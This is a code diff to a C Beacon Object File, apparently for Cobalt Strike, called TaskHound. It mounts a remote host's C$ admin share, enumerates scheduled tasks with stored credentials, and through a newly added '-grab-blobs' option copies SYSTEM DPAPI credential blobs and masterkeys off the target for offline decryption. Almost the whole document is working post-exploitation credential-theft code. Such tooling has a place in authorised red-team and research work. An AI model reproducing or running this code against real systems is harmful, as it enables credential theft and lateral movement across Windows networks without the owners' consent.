@@ -1,5 +1,5 @@
 #include <windows.h>
-#include "beacon.h"
+#include "../_include/beacon.h"
 
 // Constants
 #define MAX_PATH_LENGTH 1024
@@ -147,28 +147,13 @@ BOOL looks_like_domain_user(const char* runas) {
         return FALSE;
     }
     
-    // If username contains a backslash (DOMAIN\user), check for local/system principals
+    // If username contains a backslash (DOMAIN\user), treat as domain account
     if (bof_strstr(temp, "\\")) {
-        // Known local domains / authority names
-        if (bof_strstr(temp, "NT AUTHORITY") || bof_strstr(temp, "NT_AUTORITY") || 
-            bof_strstr(temp, "NT_AUTORITAT") || bof_strstr(temp, "NT_AUTORITÄT") || 
-            bof_strstr(temp, "LOCALHOST")) {
-            return FALSE;
-        }
-        
-        // Known local users / service accounts
-        if (bof_strstr(temp, "SYSTEM") || bof_strstr(temp, "NETZWERKDIENST") ||
-            bof_strstr(temp, "NETWORKSERVICE") || bof_strstr(temp, "LOCALSERVICE") ||
-            bof_strstr(temp, "LOCALSYSTEM")) {
-            return FALSE;
-        }
-        
-        // Otherwise treat as domain-like if it has a backslash
         return TRUE;
     }
     
-    // If it looks like a UPN or contains a dot, treat as domain user
-    if (bof_strstr(temp, ".")) {
+    // If it looks like a UPN (user@domain.com), treat as domain user
+    if (bof_strstr(temp, "@") || bof_strstr(temp, ".")) {
         return TRUE;
     }
     
@@ -501,11 +486,13 @@ void cleanup_task_info(TaskInfo* task_info, pVirtualFree fpVirtualFree) {
  * Process individual task file and return whether it should be counted
  */
 BOOL process_task_file(const char* file_path, const char* file_name, char* target, 
-                      char* save_dir, BOOL show_unsaved_creds, char* buffer, DWORD file_size,
+                      char* save_dir, BOOL show_unsaved_creds, DWORD file_size,
                       pCreateFileA fpCreateFileA, pReadFile fpReadFile, pCloseHandle fpCloseHandle,
                       pVirtualAlloc fpVirtualAlloc, pVirtualFree fpVirtualFree,
                       pWriteFile fpWriteFile, pCreateDirectoryA fpCreateDirectoryA, 
                       pGetLastError fpGetLastError) {
+    
+    char* buffer = NULL;
     
     HANDLE hFile = fpCreateFileA(file_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
@@ -695,9 +682,9 @@ int traverse_task_directory(const char* base_path, const char* current_subdir, c
                 DWORD file_size = fpGetFileSize(hFile, NULL);
                 fpCloseHandle(hFile);
                 
-                // Process the task file
+                // Process the task file (allocates its own buffer internally)
                 if (process_task_file(full_path, findFileData.cFileName, target, save_dir, show_unsaved_creds,
-                                    NULL, file_size, fpCreateFileA, fpReadFile, fpCloseHandle,
+                                    file_size, fpCreateFileA, fpReadFile, fpCloseHandle,
                                     fpVirtualAlloc, fpVirtualFree, fpWriteFile, fpCreateDirectoryA, fpGetLastError)) {
                     task_count++;
                 }
@@ -710,16 +697,272 @@ int traverse_task_directory(const char* base_path, const char* current_subdir, c
 }
 
 // ============================================================================
+// DPAPI Credential & Masterkey Collection Functions
+// ============================================================================
+
+/**
+ * Creates directory structure for saving credential blobs
+ * Creates: save_dir\hostname\credentials
+ */
+BOOL create_credentials_directory(const char* save_dir, const char* target_host,
+                                 pCreateDirectoryA fpCreateDirectoryA, char* final_path, int final_path_size) {
+    if (!save_dir || !target_host || !fpCreateDirectoryA || !final_path || final_path_size <= 0) {
+        return FALSE;
+    }
+    
+    char temp_path[MAX_PATH_LENGTH];
+    
+    // First create the save_dir if it doesn't exist
+    fpCreateDirectoryA(save_dir, NULL);
+    
+    // Create save_dir\hostname
+    if (!build_directory_path(temp_path, save_dir, target_host, sizeof(temp_path))) return FALSE;
+    fpCreateDirectoryA(temp_path, NULL);
+    
+    // Create save_dir\hostname\credentials
+    if (!bof_strcat_safe(temp_path, "\\credentials", sizeof(temp_path))) return FALSE;
+    fpCreateDirectoryA(temp_path, NULL);
+    
+    // Copy final path to output
+    return bof_strcpy_safe(final_path, temp_path, final_path_size);
+}
+
+/**
+ * Creates directory structure for saving masterkeys
+ * Creates: save_dir\hostname\masterkeys
+ */
+BOOL create_masterkeys_directory(const char* save_dir, const char* target_host,
+                                pCreateDirectoryA fpCreateDirectoryA, char* final_path, int final_path_size) {
+    if (!save_dir || !target_host || !fpCreateDirectoryA || !final_path || final_path_size <= 0) {
+        return FALSE;
+    }
+    
+    char temp_path[MAX_PATH_LENGTH];
+    
+    // First create the save_dir if it doesn't exist
+    fpCreateDirectoryA(save_dir, NULL);
+    
+    // Create save_dir\hostname
+    if (!build_directory_path(temp_path, save_dir, target_host, sizeof(temp_path))) return FALSE;
+    fpCreateDirectoryA(temp_path, NULL);
+    
+    // Create save_dir\hostname\masterkeys
+    if (!bof_strcat_safe(temp_path, "\\masterkeys", sizeof(temp_path))) return FALSE;
+    fpCreateDirectoryA(temp_path, NULL);
+    
+    // Copy final path to output
+    return bof_strcpy_safe(final_path, temp_path, final_path_size);
+}
+
+/**
+ * Collects all credential blobs from remote system
+ * Path: \\target\C$\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\*
+ */
+int collect_credential_blobs(const char* remote_path, const char* target, const char* save_dir,
+                            pFindFirstFileA fpFindFirstFileA, pFindNextFileA fpFindNextFileA,
+                            pFindClose fpFindClose, pCreateFileA fpCreateFileA,
+                            pReadFile fpReadFile, pCloseHandle fpCloseHandle,
+                            pGetFileSize fpGetFileSize, pVirtualAlloc fpVirtualAlloc,
+                            pVirtualFree fpVirtualFree, pWriteFile fpWriteFile,
+                            pCreateDirectoryA fpCreateDirectoryA, pGetLastError fpGetLastError) {
+    
+    WIN32_FIND_DATAA findFileData;
+    char search_path[MAX_PATH_LENGTH];
+    char full_path[MAX_PATH_LENGTH];
+    char save_path[MAX_PATH_LENGTH];
+    char creds_dir[MAX_PATH_LENGTH];
+    int blob_count = 0;
+    
+    // Build credential blobs path: \\target\C$\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\*
+    if (!bof_strcpy_safe(search_path, remote_path, sizeof(search_path))) return 0;
+    if (!bof_strcat_safe(search_path, "\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\*", sizeof(search_path))) return 0;
+    
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Enumerating credential blobs...\n");
+    
+    HANDLE hFind = fpFindFirstFileA(search_path, &findFileData);
+    if (hFind == INVALID_HANDLE_VALUE) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to enumerate credential blobs (Error: %d)\n", fpGetLastError());
+        return 0;
+    }
+    
+    // Create credentials save directory
+    if (!create_credentials_directory(save_dir, target, fpCreateDirectoryA, creds_dir, sizeof(creds_dir))) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create credentials directory\n");
+        fpFindClose(hFind);
+        return 0;
+    }
+    
+    do {
+        // Skip directories and special entries
+        if (findFileData.cFileName[0] == '.' ||
+            (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+            continue;
+        }
+        
+        // Only process small files (credential blobs are typically < 10KB)
+        DWORD file_size = findFileData.nFileSizeLow;
+        if (file_size > 10000 || file_size == 0) {
+            continue;
+        }
+        
+        // Build full remote path
+        if (!bof_strcpy_safe(full_path, remote_path, sizeof(full_path))) continue;
+        if (!bof_strcat_safe(full_path, "\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\", sizeof(full_path))) continue;
+        if (!bof_strcat_safe(full_path, findFileData.cFileName, sizeof(full_path))) continue;
+        
+        // Read the credential blob file
+        HANDLE hFile = fpCreateFileA(full_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) {
+            continue;
+        }
+        
+        // Allocate buffer for file content
+        char* buffer = (char*)fpVirtualAlloc(NULL, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!buffer) {
+            fpCloseHandle(hFile);
+            continue;
+        }
+        
+        // Read file content
+        DWORD bytes_read;
+        if (!fpReadFile(hFile, buffer, file_size, &bytes_read, NULL) || bytes_read != file_size) {
+            fpVirtualFree(buffer, 0, MEM_RELEASE);
+            fpCloseHandle(hFile);
+            continue;
+        }
+        fpCloseHandle(hFile);
+        
+        // Build save path
+        if (!build_directory_path(save_path, creds_dir, findFileData.cFileName, sizeof(save_path))) {
+            fpVirtualFree(buffer, 0, MEM_RELEASE);
+            continue;
+        }
+        
+        // Write the blob file
+        if (write_raw_file(save_path, buffer, file_size, fpCreateFileA, fpWriteFile, fpCloseHandle, fpGetLastError)) {
+            blob_count++;
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Collected credential blob: %s (%d bytes)\n", findFileData.cFileName, file_size);
+        }
+        
+        fpVirtualFree(buffer, 0, MEM_RELEASE);
+        
+    } while (fpFindNextFileA(hFind, &findFileData) != 0);
+    
+    fpFindClose(hFind);
+    return blob_count;
+}
+
+/**
+ * Collects all SYSTEM masterkeys from remote system
+ * Path: \\target\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\*
+ */
+int collect_masterkeys(const char* remote_path, const char* target, const char* save_dir,
+                      pFindFirstFileA fpFindFirstFileA, pFindNextFileA fpFindNextFileA,
+                      pFindClose fpFindClose, pCreateFileA fpCreateFileA,
+                      pReadFile fpReadFile, pCloseHandle fpCloseHandle,
+                      pGetFileSize fpGetFileSize, pVirtualAlloc fpVirtualAlloc,
+                      pVirtualFree fpVirtualFree, pWriteFile fpWriteFile,
+                      pCreateDirectoryA fpCreateDirectoryA, pGetLastError fpGetLastError) {
+    
+    WIN32_FIND_DATAA findFileData;
+    char search_path[MAX_PATH_LENGTH];
+    char full_path[MAX_PATH_LENGTH];
+    char save_path[MAX_PATH_LENGTH];
+    char masterkeys_dir[MAX_PATH_LENGTH];
+    int masterkey_count = 0;
+    
+    // Build masterkey path: \\target\C$\Windows\System32\Microsoft\Protect\S-1-5-18\User\*
+    if (!bof_strcpy_safe(search_path, remote_path, sizeof(search_path))) return 0;
+    if (!bof_strcat_safe(search_path, "\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\*", sizeof(search_path))) return 0;
+    
+    BeaconPrintf(CALLBACK_OUTPUT, "[*] Enumerating SYSTEM masterkeys...\n");
+    
+    HANDLE hFind = fpFindFirstFileA(search_path, &findFileData);
+    if (hFind == INVALID_HANDLE_VALUE) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to enumerate masterkeys (Error: %d)\n", fpGetLastError());
+        return 0;
+    }
+    
+    // Create masterkeys save directory
+    if (!create_masterkeys_directory(save_dir, target, fpCreateDirectoryA, masterkeys_dir, sizeof(masterkeys_dir))) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create masterkeys directory\n");
+        fpFindClose(hFind);
+        return 0;
+    }
+    
+    do {
+        // Skip directories and special entries
+        if (findFileData.cFileName[0] == '.' ||
+            (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+            continue;
+        }
+        
+        // Get file size
+        DWORD file_size = findFileData.nFileSizeLow;
+        if (file_size == 0 || file_size > 100000) {  // Skip very large files
+            continue;
+        }
+        
+        // Build full remote path
+        if (!bof_strcpy_safe(full_path, remote_path, sizeof(full_path))) continue;
+        if (!bof_strcat_safe(full_path, "\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\", sizeof(full_path))) continue;
+        if (!bof_strcat_safe(full_path, findFileData.cFileName, sizeof(full_path))) continue;
+        
+        // Read the masterkey file
+        HANDLE hFile = fpCreateFileA(full_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile == INVALID_HANDLE_VALUE) {
+            continue;
+        }
+        
+        // Allocate buffer for file content
+        char* buffer = (char*)fpVirtualAlloc(NULL, file_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!buffer) {
+            fpCloseHandle(hFile);
+            continue;
+        }
+        
+        // Read file content
+        DWORD bytes_read;
+        if (!fpReadFile(hFile, buffer, file_size, &bytes_read, NULL) || bytes_read != file_size) {
+            fpVirtualFree(buffer, 0, MEM_RELEASE);
+            fpCloseHandle(hFile);
+            continue;
+        }
+        fpCloseHandle(hFile);
+        
+        // Build save path
+        if (!build_directory_path(save_path, masterkeys_dir, findFileData.cFileName, sizeof(save_path))) {
+            fpVirtualFree(buffer, 0, MEM_RELEASE);
+            continue;
+        }
+        
+        // Write the masterkey file
+        if (write_raw_file(save_path, buffer, file_size, fpCreateFileA, fpWriteFile, fpCloseHandle, fpGetLastError)) {
+            masterkey_count++;
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Collected masterkey: %s (%d bytes)\n", findFileData.cFileName, file_size);
+        }
+        
+        fpVirtualFree(buffer, 0, MEM_RELEASE);
+        
+    } while (fpFindNextFileA(hFind, &findFileData) != 0);
+    
+    fpFindClose(hFind);
+    return masterkey_count;
+}
+
+// ============================================================================
 // Main Entry Point
 // ============================================================================
 
 void go(char* args, int len) {
     datap parser;
     char* target;
-    char* username = NULL;
-    char* password = NULL;
-    char* save_dir = NULL;
+    char* username;
+    char* password;
+    char* save_dir;
+    char* flags;
     BOOL show_unsaved_creds = FALSE;
+    BOOL grab_blobs = FALSE;
     char remote_path[512];
     NETRESOURCEA netResource;
     DWORD result;
@@ -751,56 +994,47 @@ void go(char* args, int len) {
     // Check if all required functions are available
     if (!fpWNetAddConnection2A || !fpWNetCancelConnection2A || !fpFindFirstFileA || 
         !fpFindNextFileA || !fpFindClose || !fpCreateFileA || !fpReadFile || 
-        !fpCloseHandle || !fpGetFileSize || !fpVirtualAlloc || !fpVirtualFree || 
-        (save_dir && (!fpWriteFile || !fpCreateDirectoryA))) {
+        !fpCloseHandle || !fpGetFileSize || !fpVirtualAlloc || !fpVirtualFree) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to resolve required API functions\n");
         return;
     }
     
+    // Parse arguments - Always expect 5 cstr parameters
     BeaconDataParse(&parser, args, len);
     
-    // Extract target (required)
     target = BeaconDataExtract(&parser, NULL);
-    if (!target) {
-        BeaconPrintf(CALLBACK_ERROR, "Target hostname/IP is required\n");
+    username = BeaconDataExtract(&parser, NULL);
+    password = BeaconDataExtract(&parser, NULL);
+    save_dir = BeaconDataExtract(&parser, NULL);
+    flags = BeaconDataExtract(&parser, NULL);
+    
+    // Validate required target
+    if (!target || bof_strlen(target) == 0) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Target hostname/IP is required\n");
         FreeLibrary(hMpr);
         return;
     }
     
-    // Extract optional username, password, save_dir, and flags
-    if (BeaconDataLength(&parser) > 0) {
-        username = BeaconDataExtract(&parser, NULL);
-        if (BeaconDataLength(&parser) > 0) {
-            password = BeaconDataExtract(&parser, NULL);
-            if (BeaconDataLength(&parser) > 0) {
-                save_dir = BeaconDataExtract(&parser, NULL);
-                if (BeaconDataLength(&parser) > 0) {
-                    char* flag = BeaconDataExtract(&parser, NULL);
-                    if (flag && bof_strcmp(flag, "-unsaved-creds") == 0) {
-                        show_unsaved_creds = TRUE;
-                    }
-                }
-            }
-        }
-    }
-    
-    // Handle empty strings as NULL and check for flags in arguments
+    // Handle empty strings as NULL for optional parameters
     if (username && bof_strlen(username) == 0) username = NULL;
     if (password && bof_strlen(password) == 0) password = NULL;
     if (save_dir && bof_strlen(save_dir) == 0) save_dir = NULL;
     
-    // Check if any argument is actually the -unsaved-creds flag
-    if (username && bof_strcmp(username, "-unsaved-creds") == 0) {
-        show_unsaved_creds = TRUE;
-        username = NULL;
+    // Parse flags
+    if (flags && bof_strlen(flags) > 0) {
+        if (bof_strstr(flags, "-unsaved-creds")) {
+            show_unsaved_creds = TRUE;
+        }
+        if (bof_strstr(flags, "-grab-blobs")) {
+            grab_blobs = TRUE;
+        }
     }
-    if (password && bof_strcmp(password, "-unsaved-creds") == 0) {
-        show_unsaved_creds = TRUE;
-        password = NULL;
-    }
-    if (save_dir && bof_strcmp(save_dir, "-unsaved-creds") == 0) {
-        show_unsaved_creds = TRUE;
-        save_dir = NULL;
+    
+    // Check if write functions are available when save_dir is specified
+    if (save_dir && (!fpWriteFile || !fpCreateDirectoryA)) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to resolve file write API functions\n");
+        FreeLibrary(hMpr);
+        return;
     }
     
     BeaconPrintf(CALLBACK_OUTPUT, "[+] TaskHound - Remote Task Collection\n");
@@ -812,23 +1046,43 @@ void go(char* args, int len) {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Using current user context\n");
     }
     
+    if (save_dir) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Save directory: %s\n", save_dir);
+    }
+    
+    if (show_unsaved_creds) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] Showing tasks without stored credentials\n");
+    }
+    
+    if (grab_blobs) {
+        if (save_dir) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Will collect credential blobs and masterkeys\n");
+        } else {
+            BeaconPrintf(CALLBACK_ERROR, "[-] Warning: -grab-blobs requires -save flag\n");
+            grab_blobs = FALSE;
+        }
+    }
+    
     // Setup network connection
     bof_memset(&netResource, 0, sizeof(NETRESOURCEA));
     netResource.dwType = RESOURCETYPE_DISK;
     netResource.dwDisplayType = RESOURCEDISPLAYTYPE_SHARE;
     netResource.dwUsage = RESOURCEUSAGE_CONNECTABLE;
     
-    // Build UNC path for admin share - manually construct the path
+    // Build UNC path for admin share
     if (!bof_strcpy_safe(remote_path, "\\\\", sizeof(remote_path))) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build remote path\n");
+        FreeLibrary(hMpr);
         return;
     }
     if (!bof_strcat_safe(remote_path, target, sizeof(remote_path))) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build remote path\n");
+        FreeLibrary(hMpr);
         return;
     }
     if (!bof_strcat_safe(remote_path, "\\C$", sizeof(remote_path))) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build remote path\n");
+        FreeLibrary(hMpr);
         return;
     }
     netResource.lpRemoteName = remote_path;
@@ -838,6 +1092,7 @@ void go(char* args, int len) {
     
     if (result != NO_ERROR) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to connect to %s (Error: %d)\n", remote_path, result);
+        FreeLibrary(hMpr);
         return;
     }
     
@@ -847,6 +1102,7 @@ void go(char* args, int len) {
         !bof_strcat_safe(tasks_base_path, "\\Windows\\System32\\Tasks", sizeof(tasks_base_path))) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build Tasks directory path\n");
         fpWNetCancelConnection2A(remote_path, 0, TRUE);
+        FreeLibrary(hMpr);
         return;
     }
     
@@ -857,8 +1113,39 @@ void go(char* args, int len) {
                                            fpVirtualAlloc, fpVirtualFree, fpWriteFile, 
                                            fpCreateDirectoryA, fpGetLastError);
     
+    // Collect credential blobs and masterkeys if requested
+    int blob_count = 0;
+    int masterkey_count = 0;
+    
+    if (grab_blobs && save_dir) {
+        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Collecting DPAPI files...\n");
+        
+        // Collect credential blobs
+        blob_count = collect_credential_blobs(remote_path, target, save_dir,
+                                             fpFindFirstFileA, fpFindNextFileA, fpFindClose,
+                                             fpCreateFileA, fpReadFile, fpCloseHandle,
+                                             fpGetFileSize, fpVirtualAlloc, fpVirtualFree,
+                                             fpWriteFile, fpCreateDirectoryA, fpGetLastError);
+        
+        // Collect masterkeys
+        masterkey_count = collect_masterkeys(remote_path, target, save_dir,
+                                           fpFindFirstFileA, fpFindNextFileA, fpFindClose,
+                                           fpCreateFileA, fpReadFile, fpCloseHandle,
+                                           fpGetFileSize, fpVirtualAlloc, fpVirtualFree,
+                                           fpWriteFile, fpCreateDirectoryA, fpGetLastError);
+        
+        BeaconPrintf(CALLBACK_OUTPUT, "[+] DPAPI collection complete: %d credential blobs, %d masterkeys\n", 
+                    blob_count, masterkey_count);
+    }
+    
     // Clean up network connection
     fpWNetCancelConnection2A(remote_path, 0, TRUE);
+    FreeLibrary(hMpr);
     
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Collection complete. Found %d tasks\n", task_count);
+    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] Collection complete. Found %d tasks", task_count);
+    if (grab_blobs && save_dir) {
+        BeaconPrintf(CALLBACK_OUTPUT, ", %d credential blobs, %d masterkeys\n", blob_count, masterkey_count);
+    } else {
+        BeaconPrintf(CALLBACK_OUTPUT, "\n");
+    }
 }
